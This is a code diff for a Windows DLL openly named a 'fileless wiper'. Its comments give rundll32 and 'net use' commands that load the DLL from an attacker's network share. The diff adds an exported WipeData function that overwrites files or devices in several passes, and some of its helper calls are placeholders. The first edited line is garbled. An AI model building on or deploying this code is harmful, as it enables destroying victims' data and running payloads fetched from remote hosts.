@@ -1,4 +1,4 @@
-//rundll32.exe \\attacker\share\fileless_wiper.dll,RunWipe
+build_windows.bat//rundll32.exe \\attacker\share\fileless_wiper.dll,RunWipe
 // if hosted on a share: 
 //net use Z: \\attacker\share , rundll32.exe Z:\fileless_wiper.dll,RunWipe
 
@@ -116,4 +116,39 @@ NTSTATUS NTAPI DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         break;
     }
     return STATUS_SUCCESS;
+}
+
+extern "C" __declspec(dllexport) BOOL WipeData(LPCWSTR targetPath, int passes) {
+    // Convert LPCWSTR to char*
+    char nativePath[MAX_PATH] = {0};
+    int ret = WideCharToMultiByte(CP_ACP, 0, targetPath, -1, nativePath, MAX_PATH, NULL, NULL);
+    if (ret == 0) return FALSE;
+
+    wipe_ctx ctx;
+    int max_size = 4096; // Example buffer size, adjust as needed
+    int method = 1;      // Use DoD mode
+    int cipher = 0;      // Example cipher, adjust as needed
+
+    // Open file/device for wiping (pseudo, replace with your actual hook logic)
+    void* hook = fast_wipe_open(nativePath);
+    if (!hook) return FALSE;
+
+    if (dc_wipe_init(&ctx, hook, max_size, method, cipher) != ST_OK) {
+        fast_wipe_close(hook);
+        return FALSE;
+    }
+
+    // Wipe the file/device in blocks
+    // (Pseudo: get file size, loop over blocks)
+    LARGE_INTEGER fileSize = fast_wipe_get_size(hook);
+    for (LONGLONG offset = 0; offset < fileSize.QuadPart; offset += max_size) {
+        int blockSize = (int)min(max_size, fileSize.QuadPart - offset);
+        for (int i = 0; i < passes; ++i) {
+            dc_wipe_process(&ctx, offset, blockSize);
+        }
+    }
+
+    dc_wipe_free(&ctx);
+    fast_wipe_close(hook);
+    return TRUE;
 }
